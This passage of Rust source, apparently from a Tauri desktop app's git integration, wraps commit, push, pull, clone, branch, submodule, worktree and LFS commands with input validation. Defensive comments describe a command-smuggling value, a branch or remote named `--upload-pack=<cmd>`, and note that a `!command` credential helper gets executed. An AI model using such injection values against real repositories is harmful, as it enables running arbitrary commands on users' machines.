            .args(["-c", "core.quotepath=false", "add", "-u", "--"])
            .args(&needs_stage_tracked);
        let out = git_output_local(&mut add).map_err(|e| format!("git add failed: {}", e))?;
        if !out.status.success() {
            return Err(String::from_utf8_lossy(&out.stderr).to_string());
        }
    }

    let addable_untracked = if untracked.is_empty() {
        Vec::new()
    } else {
        git_ls_files_paths(dir, &untracked, true)?
    };
    if !addable_untracked.is_empty() {
        let mut add = git_cmd();
        add.arg("-C")
            .arg(dir)
            .args(["-c", "core.quotepath=false", "add", "--"])
            .args(&addable_untracked);
        let out = git_output_local(&mut add).map_err(|e| format!("git add failed: {}", e))?;
        if !out.status.success() {
            return Err(String::from_utf8_lossy(&out.stderr).to_string());
        }
    }

    let mut effective = already_staged;
    effective.extend(needs_stage_tracked);
    effective.extend(addable_untracked);
    if effective.is_empty() {
        return Err("所选文件均被 .gitignore 忽略或不存在，未执行提交".to_string());
    }
    Ok(effective)
}

/// 解析仓库的 `.git` 目录绝对路径（兼容 worktree）。
fn resolve_git_dir_path(dir: &str) -> Option<PathBuf> {
    let out = git_output(
        git_cmd()
            .arg("-C")
            .arg(dir)
            .args(["rev-parse", "--git-dir"]),
    )
    .ok()?;
    if !out.status.success() {
        return None;
    }
    let raw = String::from_utf8_lossy(&out.stdout).trim().to_string();
    if raw.is_empty() {
        return None;
    }
    Some(Path::new(dir).join(raw))
}

/// 当前仓库是否处于 merge / cherry-pick / rebase 的未完成状态。
///
/// Git 在这些 sequencer 操作中禁止 `commit --only <paths>`（partial commit）；
/// 此时只能提交整个 index，并让 `git commit` 完成/推进当前操作。
fn sequencer_blocks_partial_commit(dir: &str) -> bool {
    let git_dir = match resolve_git_dir_path(dir) {
        Some(d) => d,
        None => return false,
    };
    [
        "CHERRY_PICK_HEAD",
        "MERGE_HEAD",
        "rebase-merge",
        "rebase-apply",
    ]
    .iter()
    .any(|name| git_dir.join(name).exists())
}

#[tauri::command]
pub fn git_commit(
    repo_path: Option<String>,
    message: String,
    amend: bool,
    // 仅提交这些路径（路径规范）；为空或 None 时提交全部变更
    paths: Option<Vec<String>>,
) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());

    // 对齐 PyCharm changelist 提交语义：提交哪些文件就先 stage 哪些文件
    //（未跟踪文件必须先 add 才能被提交），并与其余暂存内容隔离。
    let selected: Vec<String> = paths
        .unwrap_or_default()
        .into_iter()
        .map(|p| p.trim().to_string())
        .filter(|p| !p.is_empty())
        .map(|p| {
            let rel = to_repo_relative(&dir, &p)?;
            ensure_safe_git_path(&rel)?;
            Ok(rel)
        })
        .collect::<Result<Vec<_>, String>>()?;

    // 先按路径在 index 中的状态分流 stage：已跟踪文件可位于忽略目录内，
    // 未被忽略的未跟踪文件正常 add，被忽略的未跟踪文件直接剔除。
    let selected_for_commit = if selected.is_empty() {
        Vec::new()
    } else {
        stage_selected_for_commit(&dir, &selected)?
    };
    let sequencer = sequencer_blocks_partial_commit(&dir);

    let mut cmd = git_cmd();
    cmd.arg("-C").arg(&dir).arg("commit");

    if amend {
        cmd.arg("--amend");
    }

    // 判断暂存区是否含有用户未选中的其他暂存变更。
    let unselected_staged: Vec<String> = if selected_for_commit.is_empty() {
        Vec::new()
    } else {
        let staged_now = git_staged_paths(&dir)?;
        let selected_set: HashSet<&str> = selected_for_commit.iter().map(String::as_str).collect();
        staged_now
            .into_iter()
            .filter(|p| !selected_set.contains(p.as_str()))
            .collect()
    };

    let mut tmp_index_to_clean: Option<PathBuf> = None;

    if !selected_for_commit.is_empty() && !sequencer && !unselected_staged.is_empty() {
        // 存在未选中的其他暂存变更：使用临时 index 隔离未选中项，
        // 避开 git commit --only 强制从磁盘重读导致 git rm --cached 删除提交失败的问题。
        if let Some(git_dir) = resolve_git_dir_path(&dir) {
            let real_index = git_dir.join("index");
            let tmp_index = git_dir.join(format!("index.tmp.{}", std::process::id()));
            if real_index.exists() && std::fs::copy(&real_index, &tmp_index).is_ok() {
                let mut reset = git_cmd();
                reset
                    .arg("-C")
                    .arg(&dir)
                    .env("GIT_INDEX_FILE", &tmp_index)
                    .args(["reset", "-q", "HEAD", "--"])
                    .args(&unselected_staged);
                if let Err(e) = git_output_local(&mut reset) {
                    log::warn!("临时 index 重置未选中暂存项失败: {e}");
                }
                cmd.env("GIT_INDEX_FILE", &tmp_index);
                tmp_index_to_clean = Some(tmp_index);
            } else {
                cmd.arg("--only");
                cmd.arg("--");
                for p in &selected_for_commit {
                    cmd.arg(p);
                }
            }
        } else {
            cmd.arg("--only");
            cmd.arg("--");
            for p in &selected_for_commit {
                cmd.arg(p);
            }
        }
    } else if selected_for_commit.is_empty() && !amend && !sequencer {
        // 全部提交：add -A（含未跟踪与删除）后整体提交。
        // amend 不能走这里：--amend 未选文件只应改提交信息，不能被 add -A
        // 顺带塞进工作区里所有未跟踪文件。sequencer 在途时也不能 add -A：
        // 只能提交 index（用户已解决的冲突），不能把无关工作区改动卷进来。
        let add_out = git_output_local(git_cmd().arg("-C").arg(&dir).args([
            "-c",
            "core.quotepath=false",
            "add",
            "-A",
        ]))
        .map_err(|e| format!("git add failed: {}", e))?;
        if !add_out.status.success() {
            return Err(String::from_utf8_lossy(&add_out.stderr).to_string());
        }
    }

    // amend 且未填写信息时保留原提交信息
    let msg = message.trim();
    if msg.is_empty() {
        if amend {
            cmd.arg("--no-edit");
        } else {
            return Err(crate::error_proto::coded("commit_message_empty", ""));
        }
    } else {
        cmd.arg("-m").arg(msg);
    }

    let output = git_output_local(&mut cmd).map_err(|e| {
        if let Some(ref tmp) = tmp_index_to_clean {
            let _ = std::fs::remove_file(tmp);
        }
        format!("commit failed: {}", e)
    })?;
    if let Some(ref tmp) = tmp_index_to_clean {
        let _ = std::fs::remove_file(tmp);
    }
    if !output.status.success() {
        return Err(String::from_utf8_lossy(&output.stderr).to_string());
    }
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

#[tauri::command]
pub async fn git_push(
    repo_path: Option<String>,
    remote: Option<String>,
    branch: Option<String>,
    // 分支无上游时置 true，等价 git push -u
    set_upstream: Option<bool>,
    // 安全强推（--force-with-lease）
    force: Option<bool>,
    // 推送所有标签（--tags）
    push_tags: Option<bool>,
) -> Result<String, String> {
    // push 走网络，无凭据时能卡到超时（60s），同步执行会把 ipc worker 按住
    // 整整一分钟。丢到 blocking 池让 worker 立刻脱身。
    tauri::async_runtime::spawn_blocking(move || {
        let dir = repo_path.unwrap_or_else(|| ".".to_string());
        authorize_git_repo(&dir, true)?;
        let remote_name = remote.unwrap_or_else(|| "origin".to_string());
        // remote / branch 都是「仓库可控或前端可控」的外部输入：
        // - branch 来自 `git branch` 的输出，而分支名是仓库产物 —— 恶意仓库可以
        //   建一个叫 `--upload-pack=<cmd>` 的分支（合法 ref 名），选它推送即选项注入。
        // - remote 来自 gitconfig，同样可被仓库内的 .git/config 污染。
        // - branch 还必须是单个 ref 名而非 refspec（`HEAD:refs/heads/x` 能把
        //   本地任意提交推到任意 ref）。
        // 三道校验都在 spawn 之前，失败即返回 Err（不执行任何 git）。
        reject_option_like(&remote_name)?;
        if let Some(b) = &branch {
            reject_option_like(b)?;
            reject_refspec_like(b)?;
        }

        let mut cmd = network_git_cmd(&dir);
        cmd.arg("push");

        if force.unwrap_or(false) {
            cmd.arg("--force-with-lease");
        }
        if set_upstream.unwrap_or(false) {
            cmd.arg("-u");
        }
        if push_tags.unwrap_or(false) {
            cmd.arg("--tags");
        }
        // 位置参数（remote、refspec）之前显式收尾：保证其后的任何字符串都不被
        // 解析成选项，即使上面的校验漏了某种形态。位置必须在所有选项之后。
        cmd.arg("--end-of-options");
        cmd.arg(&remote_name);
        if let Some(b) = &branch {
            cmd.arg(b);
        }

        let output = run_with_timeout(cmd, 60).map_err(|e| format!("push failed: {}", e))?;
        let text = network_output_text(&output);
        if !output.status.success() {
            return Err(text);
        }
        Ok(text)
    })
    .await
    .map_err(|e| format!("git_push 任务失败: {e}"))?
}

/// 拉取并整合远程更新：strategy = "merge"（默认）或 "rebase"，等价 PyCharm Update Project
#[tauri::command]
pub async fn git_pull(
    repo_path: Option<String>,
    remote: Option<String>,
    branch: Option<String>,
    rebase: Option<bool>,
) -> Result<String, String> {
    // 同 git_push：网络 + 凭据可能长时间阻塞，不占 ipc worker。
    tauri::async_runtime::spawn_blocking(move || {
        let dir = repo_path.unwrap_or_else(|| ".".to_string());
        authorize_git_repo(&dir, true)?;
        // remote / branch 同 git_push：仓库可控（gitconfig、分支名）+ 前端可控。
        // pull 的 refspec 同样不在此命令的语义内（前端只传 remote + rebase）。
        if let Some(r) = &remote {
            reject_option_like(r)?;
        }
        if let Some(b) = &branch {
            reject_option_like(b)?;
            reject_refspec_like(b)?;
        }

        let mut cmd = network_git_cmd(&dir);
        cmd.arg("pull");
        if rebase.unwrap_or(false) {
            cmd.arg("--rebase");
        }
        // 位置参数前收尾，位置在所有选项之后
        if remote.is_some() || branch.is_some() {
            cmd.arg("--end-of-options");
        }
        if let Some(r) = &remote {
            cmd.arg(r);
        }
        if let Some(b) = &branch {
            cmd.arg(b);
        }

        let output = run_with_timeout(cmd, 120).map_err(|e| format!("pull failed: {}", e))?;
        let text = network_output_text(&output);
        if !output.status.success() {
            return Err(text);
        }
        Ok(text)
    })
    .await
    .map_err(|e| format!("git_pull 任务失败: {e}"))?
}

/// 获取远程更新（不整合）；remote 为空时 --all
#[tauri::command]
pub async fn git_fetch(
    repo_path: Option<String>,
    remote: Option<String>,
) -> Result<String, String> {
    // 同 git_push：网络 + 凭据可能长时间阻塞，不占 ipc worker。
    tauri::async_runtime::spawn_blocking(move || {
        let dir = repo_path.unwrap_or_else(|| ".".to_string());
        authorize_git_repo(&dir, true)?;
        // remote 同 git_push：来自 gitconfig，可被仓库内的 .git/config 污染。
        // `--upload-pack=<cmd>` 形远程名不经校验即选项注入（push/pull 都有，
        // 此处曾遗漏）。位置参数前同样收尾。
        if let Some(r) = &remote {
            reject_option_like(r)?;
        }

        let mut cmd = network_git_cmd(&dir);
        cmd.arg("fetch");
        match &remote {
            Some(r) => cmd.arg("--end-of-options").arg(r),
            None => cmd.arg("--all"),
        };

        let output = run_with_timeout(cmd, 120).map_err(|e| format!("fetch failed: {}", e))?;
        let text = network_output_text(&output);
        if !output.status.success() {
            return Err(text);
        }
        Ok(text)
    })
    .await
    .map_err(|e| format!("git_fetch 任务失败: {e}"))?
}

#[tauri::command]
pub fn git_checkout(repo_path: Option<String>, branch: String) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let name = branch.trim().to_string();
    reject_option_like(&name)?;

    // DWIM：名称对应某个远程分支（如 origin/feature）时，本地不存在则创建跟踪分支后检出，
    // 对齐 PyCharm「检出远程分支」行为
    let remote_ref_exists = git_output(git_cmd().arg("-C").arg(&dir).args([
        "show-ref",
        "--verify",
        "--quiet",
        &format!("refs/remotes/{}", name),
    ]))
    .map_err(|e| format!("git 调用失败: {}", e))?
    .status
    .success();

    let output = if remote_ref_exists {
        // 只去掉 remote 名，保留完整分支路径：
        // origin/feature/x 的本地名是 feature/x，不是最后一段 x。
        let local = name
            .split_once('/')
            .map(|(_, rest)| rest)
            .unwrap_or(&name)
            .to_string();
        let local_exists = git_output(git_cmd().arg("-C").arg(&dir).args([
            "show-ref",
            "--verify",
            "--quiet",
            &format!("refs/heads/{}", local),
        ]))
        .map_err(|e| format!("git 调用失败: {}", e))?
        .status
        .success();

        if local_exists {
            git_output_local(git_cmd().arg("-C").arg(&dir).args([
                "checkout",
                "--end-of-options",
                &local,
            ]))
            .map_err(|e| format!("checkout failed: {}", e))?
        } else {
            // --track 的取值必须紧跟在它后面，插不进 --end-of-options；
            // 该路径由入口的 reject_option_like 兜底
            git_output_local(
                git_cmd()
                    .arg("-C")
                    .arg(&dir)
                    .args(["checkout", "--track", &name]),
            )
            .map_err(|e| format!("checkout failed: {}", e))?
        }
    } else {
        git_output_local(git_cmd().arg("-C").arg(&dir).args([
            "checkout",
            "--end-of-options",
            &name,
        ]))
        .map_err(|e| format!("checkout failed: {}", e))?
    };

    if !output.status.success() {
        return Err(String::from_utf8_lossy(&output.stderr).to_string());
    }
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

/// 从指定起点创建并切换分支；start_point 为空时从当前 HEAD 创建
#[tauri::command]
pub fn git_create_branch(
    repo_path: Option<String>,
    branch: String,
    start_point: Option<String>,
) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    reject_option_like(&branch)?;
    let mut cmd = git_cmd();
    // `-b` 紧跟的下一个 token 原样作为分支名取值（parse-options 对必填选项值
    // 不做选项解析），所以分支名直接跟在 `-b` 后面；`--end-of-options` 只能
    // 放在起点之前 —— 之前写成 `checkout -b --end-of-options <branch>` 会把
    // `--end-of-options` 当成分支名（`fatal: '--end-of-options' is not a valid
    // branch name`），带起点与不带起点的建分支全灭，功能测试抓到（git_menu_test）。
    cmd.arg("-C").arg(&dir).args(["checkout", "-b", &branch]);
    if let Some(sp) = start_point.as_deref().filter(|s| !s.trim().is_empty()) {
        reject_option_like(sp)?;
        cmd.arg("--end-of-options").arg(sp.trim());
    }

    let output = git_output_local(&mut cmd).map_err(|e| format!("create branch failed: {}", e))?;
    if !output.status.success() {
        return Err(String::from_utf8_lossy(&output.stderr).to_string());
    }
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

/// 重命名本地分支（git branch -m）
#[tauri::command]
pub fn git_rename_branch(
    repo_path: Option<String>,
    old_name: String,
    new_name: String,
) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    reject_option_like(&old_name)?;
    reject_option_like(&new_name)?;
    let output = git_output_local(git_cmd().arg("-C").arg(&dir).args([
        "branch",
        "-m",
        "--end-of-options",
        old_name.trim(),
        new_name.trim(),
    ]))
    .map_err(|e| format!("rename branch failed: {}", e))?;
    if !output.status.success() {
        return Err(String::from_utf8_lossy(&output.stderr).to_string());
    }
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

/// 删除分支：本地用 git branch -d/-D；远程用 git push <remote> --delete <branch>
#[tauri::command]
pub async fn git_delete_branch(
    repo_path: Option<String>,
    name: String,
    is_remote: Option<bool>,
    force: Option<bool>,
) -> Result<String, String> {
    // 远程删除走 git push（网络），同步执行会占住 ipc worker 直到超时。
    tauri::async_runtime::spawn_blocking(move || {
        let dir = repo_path.unwrap_or_else(|| ".".to_string());
        authorize_git_repo(&dir, true)?;
        let name = name.trim().to_string();
        reject_option_like(&name)?;

        let output = if is_remote.unwrap_or(false) {
            let (remote, branch) = name
                .split_once('/')
                .ok_or_else(|| "远程分支名需形如 origin/feature".to_string())?;
            // push 的位置参数无法插 --end-of-options（--delete 的取值紧跟其后），
            // 靠入口校验拦住前导 -
            reject_option_like(remote)?;
            reject_option_like(branch)?;
            let mut cmd = network_git_cmd(&dir);
            cmd.args(["push", remote, "--delete", branch]);
            run_with_timeout(cmd, 60).map_err(|e| format!("delete remote branch failed: {}", e))?
        } else {
            let flag = if force.unwrap_or(false) { "-D" } else { "-d" };
            git_output_local(git_cmd().arg("-C").arg(&dir).args([
                "branch",
                flag,
                "--end-of-options",
                &name,
            ]))
            .map_err(|e| format!("delete branch failed: {}", e))?
        };

        if !output.status.success() {
            return Err(network_output_text(&output));
        }
        // 远程分支删除的 stdout 会回显 remote URL（可能带 token）
        Ok(network_output_text(&output))
    })
    .await
    .map_err(|e| format!("git_delete_branch 任务失败: {e}"))?
}

/// 列出标签：Branch 下拉的 Tags 区与 Checkout Tag 入口使用。
#[tauri::command]
pub fn git_list_tags(repo_path: Option<String>) -> Result<Vec<GitTagDto>, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let output = git_output(git_cmd().arg("-C").arg(&dir).args([
        "-c",
        "core.quotepath=false",
        "for-each-ref",
        "--format=%(refname:short)%09%(objectname:short)%09%(creatordate:short)%09%(subject)",
        "refs/tags/",
    ]))
    .map_err(|e| format!("git tag list failed: {}", e))?;
    if !output.status.success() {
        return Err(String::from_utf8_lossy(&output.stderr).trim().to_string());
    }
    let mut tags = Vec::new();
    for line in String::from_utf8_lossy(&output.stdout).lines() {
        let mut parts = line.splitn(4, '\t');
        let name = parts.next().unwrap_or("").trim();
        if name.is_empty() {
            continue;
        }
        tags.push(GitTagDto {
            name: name.to_string(),
            short_hash: parts.next().unwrap_or("").trim().to_string(),
            date: parts.next().unwrap_or("").trim().to_string(),
            message: parts.next().unwrap_or("").trim().to_string(),
        });
    }
    Ok(tags)
}

/// 删除本地标签。远程标签由 Push --tags / 远程管理处理。
#[tauri::command]
pub fn git_delete_tag(repo_path: Option<String>, name: String) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let name = name.trim();
    reject_option_like(name)?;
    let output = git_output_local(git_cmd().arg("-C").arg(&dir).args(["tag", "-d", name]))
        .map_err(|e| format!("git tag delete failed: {}", e))?;
    if !output.status.success() {
        return Err(String::from_utf8_lossy(&output.stderr).trim().to_string());
    }
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

/// Clone 仓库到指定目录。URL 是用户显式输入，dest 由原生目录选择器给出。
#[tauri::command]
pub async fn git_clone(
    url: String,
    destination: String,
    registry: tauri::State<'_, WorkspaceRegistry>,
    grants: tauri::State<'_, PathGrantRegistry>,
) -> Result<String, String> {
    let allowed = authorize_workspace_path(&registry, &destination, true).is_ok()
        || grants.is_contained(Path::new(&destination));
    if !allowed {
        return Err(crate::error_proto::coded(
            "path_outside_workspace",
            &destination,
        ));
    }
    tauri::async_runtime::spawn_blocking(move || {
        let url = url.trim();
        let dest = destination.trim();
        if url.is_empty() || dest.is_empty() {
            return Err("仓库 URL 与目标目录不能为空".to_string());
        }
        if url.chars().any(|c| c.is_control()) || dest.chars().any(|c| c.is_control()) {
            return Err("Clone 参数含控制字符".to_string());
        }
        reject_option_like(url)?;
        let mut cmd = git_cmd();
        cmd.env("GIT_TERMINAL_PROMPT", "0");
        cmd.env("GCM_INTERACTIVE", "never");
        cmd.env(
            "GIT_SSH_COMMAND",
            "ssh -oBatchMode=yes -oStrictHostKeyChecking=accept-new",
        );
        cmd.args(["clone", "--", url, dest]);
        let output = run_with_timeout(cmd, 300).map_err(|e| format!("clone failed: {e}"))?;
        if !output.status.success() {
            return Err(mask_credentials(
                String::from_utf8_lossy(&output.stderr).trim(),
            ));
        }
        Ok(mask_credentials(&format!(
            "{}{}",
            String::from_utf8_lossy(&output.stdout),
            String::from_utf8_lossy(&output.stderr)
        )))
    })
    .await
    .map_err(|e| format!("git_clone 任务失败: {e}"))?
}

fn submodule_config(dir: &str) -> std::collections::HashMap<String, (String, String, String)> {
    let mut map = std::collections::HashMap::new();
    let out = match git_output(git_cmd().arg("-C").arg(dir).args([
        "config",
        "-f",
        ".gitmodules",
        "--get-regexp",
        r"^submodule\..*\.(path|url|branch)$",
    ])) {
        Ok(o) if o.status.success() => o,
        _ => return map,
    };
    // 先按 submodule 名收集三字段，再按 path 建索引。
    let mut raw: std::collections::HashMap<String, (String, String, String)> =
        std::collections::HashMap::new();
    for line in String::from_utf8_lossy(&out.stdout).lines() {
        let Some((key, value)) = line.split_once(' ') else {
            continue;
        };
        let Some(rest) = key.strip_prefix("submodule.") else {
            continue;
        };
        let Some((name, field)) = rest.rsplit_once('.') else {
            continue;
        };
        let e = raw.entry(name.to_string()).or_default();
        match field {
            "path" => e.0 = value.trim().to_string(),
            "url" => e.1 = value.trim().to_string(),
            "branch" => e.2 = value.trim().to_string(),
            _ => {}
        }
    }
    for (_, (path, url, branch)) in raw {
        if !path.is_empty() {
            map.insert(path, (url, branch, String::new()));
        }
    }
    map
}

#[tauri::command]
pub fn git_submodule_list(repo_path: Option<String>) -> Result<Vec<GitSubmoduleDto>, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let cfg = submodule_config(&dir);
    let out =
        git_output(
            git_cmd()
                .arg("-C")
                .arg(&dir)
                .args(["submodule", "status", "--recursive"]),
        )
        .map_err(|e| format!("git submodule status failed: {e}"))?;
    if !out.status.success() {
        return Err(String::from_utf8_lossy(&out.stderr).trim().to_string());
    }
    let mut list = Vec::new();
    for line in String::from_utf8_lossy(&out.stdout).lines() {
        let mut parts = line.split_whitespace();
        let status = parts
            .next()
            .unwrap_or(" ")
            .chars()
            .next()
            .unwrap_or(' ')
            .to_string();
        let _hash = parts.next();
        let path = parts.next().unwrap_or("").to_string();
        if path.is_empty() {
            continue;
        }
        let (url, branch, _) = cfg.get(&path).cloned().unwrap_or_default();
        list.push(GitSubmoduleDto {
            path,
            url,
            branch,
            status,
        });
    }
    Ok(list)
}

#[tauri::command]
pub fn git_submodule_add(
    repo_path: Option<String>,
    url: String,
    path: String,
    branch: Option<String>,
) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let url = url.trim();
    let path = path.trim();
    if url.is_empty() || path.is_empty() {
        return Err("子模块 URL 与路径不能为空".to_string());
    }
    reject_option_like(url)?;
    ensure_safe_git_path(path)?;
    let mut cmd = git_cmd();
    cmd.arg("-C").arg(&dir).args(["submodule", "add"]);
    if let Some(b) = branch.as_deref().map(str::trim).filter(|b| !b.is_empty()) {
        reject_option_like(b)?;
        cmd.args(["-b", b]);
    }
    cmd.args(["--", url, path]);
    let out = git_output_local(&mut cmd).map_err(|e| format!("submodule add failed: {e}"))?;
    if !out.status.success() {
        return Err(String::from_utf8_lossy(&out.stderr).trim().to_string());
    }
    Ok(String::from_utf8_lossy(&out.stdout).to_string())
}

#[tauri::command]
pub fn git_submodule_update(
    repo_path: Option<String>,
    path: Option<String>,
) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let mut cmd = git_cmd();
    cmd.arg("-C")
        .arg(&dir)
        .args(["submodule", "update", "--init", "--recursive"]);
    if let Some(p) = path.as_deref().map(str::trim).filter(|p| !p.is_empty()) {
        ensure_safe_git_path(p)?;
        cmd.args(["--", p]);
    }
    let out = git_output_local(&mut cmd).map_err(|e| format!("submodule update failed: {e}"))?;
    if !out.status.success() {
        return Err(String::from_utf8_lossy(&out.stderr).trim().to_string());
    }
    Ok(String::from_utf8_lossy(&out.stdout).to_string())
}

#[tauri::command]
pub fn git_submodule_sync(repo_path: Option<String>) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let out =
        git_output_local(
            git_cmd()
                .arg("-C")
                .arg(&dir)
                .args(["submodule", "sync", "--recursive"]),
        )
        .map_err(|e| format!("submodule sync failed: {e}"))?;
    if !out.status.success() {
        return Err(String::from_utf8_lossy(&out.stderr).trim().to_string());
    }
    Ok(String::from_utf8_lossy(&out.stdout).to_string())
}

#[tauri::command]
pub fn git_worktree_list(repo_path: Option<String>) -> Result<Vec<GitWorktreeDto>, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let out = git_output(
        git_cmd()
            .arg("-C")
            .arg(&dir)
            .args(["worktree", "list", "--porcelain"]),
    )
    .map_err(|e| format!("git worktree list failed: {e}"))?;
    if !out.status.success() {
        return Err(String::from_utf8_lossy(&out.stderr).trim().to_string());
    }
    let mut list = Vec::new();
    let mut cur = GitWorktreeDto {
        path: String::new(),
        head: String::new(),
        branch: String::new(),
        detached: false,
        bare: false,
        locked: false,
    };
    let flush = |cur: &mut GitWorktreeDto, list: &mut Vec<GitWorktreeDto>| {
        if !cur.path.is_empty() {
            list.push(cur.clone());
        }
        *cur = GitWorktreeDto {
            path: String::new(),
            head: String::new(),
            branch: String::new(),
            detached: false,
            bare: false,
            locked: false,
        };
    };
    for line in String::from_utf8_lossy(&out.stdout).lines() {
        if line.is_empty() {
            flush(&mut cur, &mut list);
        } else if let Some(v) = line.strip_prefix("worktree ") {
            cur.path = v.to_string();
        } else if let Some(v) = line.strip_prefix("HEAD ") {
            cur.head = v.to_string();
        } else if let Some(v) = line.strip_prefix("branch refs/heads/") {
            cur.branch = v.to_string();
        } else if line == "detached" {
            cur.detached = true;
        } else if line == "bare" {
            cur.bare = true;
        } else if line.starts_with("locked") {
            cur.locked = true;
        }
    }
    flush(&mut cur, &mut list);
    Ok(list)
}

#[tauri::command]
pub fn git_worktree_add(
    repo_path: Option<String>,
    path: String,
    branch: Option<String>,
    create_branch: Option<bool>,
    registry: tauri::State<'_, WorkspaceRegistry>,
    grants: tauri::State<'_, PathGrantRegistry>,
) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let path = path.trim();
    if path.is_empty() {
        return Err("工作树路径不能为空".to_string());
    }
    if path.chars().any(|c| c.is_control()) {
        return Err("工作树路径含控制字符".to_string());
    }
    let allowed = authorize_workspace_path(&registry, path, true).is_ok()
        || grants.is_contained(Path::new(path));
    if !allowed {
        return Err(crate::error_proto::coded("path_outside_workspace", path));
    }
    let branch = branch.as_deref().map(str::trim).filter(|b| !b.is_empty());
    let mut cmd = git_cmd();
    cmd.arg("-C").arg(&dir).args(["worktree", "add"]);
    if create_branch.unwrap_or(false) {
        let b = branch.ok_or("新建工作树需要分支名")?;
        reject_option_like(b)?;
        cmd.args(["-b", b]);
    }
    cmd.arg("--").arg(path);
    if !create_branch.unwrap_or(false) {
        if let Some(b) = branch {
            reject_option_like(b)?;
            cmd.arg(b);
        }
    }
    let out = git_output_local(&mut cmd).map_err(|e| format!("worktree add failed: {e}"))?;
    if !out.status.success() {
        return Err(String::from_utf8_lossy(&out.stderr).trim().to_string());
    }
    Ok(String::from_utf8_lossy(&out.stdout).to_string())
}

#[tauri::command]
pub fn git_worktree_remove(
    repo_path: Option<String>,
    path: String,
    force: Option<bool>,
) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let path = path.trim();
    if path.is_empty() {
        return Err("工作树路径不能为空".to_string());
    }
    let mut cmd = git_cmd();
    cmd.arg("-C").arg(&dir).args(["worktree", "remove"]);
    if force.unwrap_or(false) {
        cmd.arg("--force");
    }
    cmd.arg("--").arg(path);
    let out = git_output_local(&mut cmd).map_err(|e| format!("worktree remove failed: {e}"))?;
    if !out.status.success() {
        return Err(String::from_utf8_lossy(&out.stderr).trim().to_string());
    }
    Ok(String::from_utf8_lossy(&out.stdout).to_string())
}

#[tauri::command]
pub fn git_lfs_status(repo_path: Option<String>) -> GitLfsStatusDto {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let version = git_output(git_cmd().args(["lfs", "version"]));
    let (installed, version_text) = match version {
        Ok(o) if o.status.success() => {
            (true, String::from_utf8_lossy(&o.stdout).trim().to_string())
        }
        _ => (false, String::new()),
    };
    if !installed {
        return GitLfsStatusDto {
            installed: false,
            version: String::new(),
            files: Vec::new(),
            error: "git-lfs 未安装".to_string(),
        };
    }
    let files = match git_output(
        git_cmd()
            .arg("-C")
            .arg(&dir)
            .args(["lfs", "ls-files", "-n"]),
    ) {
        Ok(o) if o.status.success() => String::from_utf8_lossy(&o.stdout)
            .lines()
            .map(str::trim)
            .filter(|l| !l.is_empty())
            .map(str::to_string)
            .collect(),
        Ok(o) => {
            return GitLfsStatusDto {
                installed: true,
                version: version_text,
                files: Vec::new(),
                error: String::from_utf8_lossy(&o.stderr).trim().to_string(),
            }
        }
        Err(e) => {
            return GitLfsStatusDto {
                installed: true,
                version: version_text,
                files: Vec::new(),
                error: e,
            }
        }
    };
    GitLfsStatusDto {
        installed: true,
        version: version_text,
        files,
        error: String::new(),
    }
}

#[tauri::command]
pub async fn git_lfs_pull(repo_path: Option<String>) -> Result<String, String> {
    tauri::async_runtime::spawn_blocking(move || {
        let dir = repo_path.unwrap_or_else(|| ".".to_string());
        authorize_git_repo(&dir, true)?;
        let mut cmd = network_git_cmd(&dir);
        cmd.args(["lfs", "pull"]);
        let out = run_with_timeout(cmd, 300).map_err(|e| format!("git lfs pull failed: {e}"))?;
        if !out.status.success() {
            return Err(mask_credentials(
                String::from_utf8_lossy(&out.stderr).trim(),
            ));
        }
        Ok(mask_credentials(&format!(
            "{}{}",
            String::from_utf8_lossy(&out.stdout),
            String::from_utf8_lossy(&out.stderr)
        )))
    })
    .await
    .map_err(|e| format!("git_lfs_pull 任务失败: {e}"))?
}

#[tauri::command]
pub fn git_lfs_track(repo_path: Option<String>, pattern: String) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let pattern = pattern.trim();
    if pattern.is_empty() {
        return Err("LFS 模式不能为空".to_string());
    }
    let mut cmd = git_cmd();
    cmd.arg("-C")
        .arg(&dir)
        .args(["lfs", "track", "--", pattern]);
    let out = git_output_local(&mut cmd).map_err(|e| format!("git lfs track failed: {e}"))?;
    if !out.status.success() {
        return Err(String::from_utf8_lossy(&out.stderr).trim().to_string());
    }
    Ok(String::from_utf8_lossy(&out.stdout).to_string())
}

#[tauri::command]
pub fn git_credential_status() -> GitCredentialStatusDto {
    let helper = git_output(git_cmd().args(["config", "--global", "--get", "credential.helper"]))
        .ok()
        .filter(|o| o.status.success())
        .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
        .unwrap_or_default();
    let exec_path = git_output(git_cmd().arg("--exec-path"))
        .ok()
        .filter(|o| o.status.success())
        .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
        .unwrap_or_default();
    let osx_keychain_available = !exec_path.is_empty()
        && Path::new(&exec_path)
            .join("git-credential-osxkeychain")
            .exists();
    GitCredentialStatusDto {
        helper,
        osx_keychain_available,
    }
}

#[tauri::command]
pub fn git_credential_set_helper(helper: String) -> Result<String, String> {
    let helper = helper.trim();
    if helper.is_empty() || helper.chars().any(|c| c.is_control()) {
        return Err("凭据 helper 不能为空或含控制字符".to_string());
    }
    // `credential.helper` supports `!command`, which Git executes on the next
    // credential request. Only accept the known helper names the UI offers.
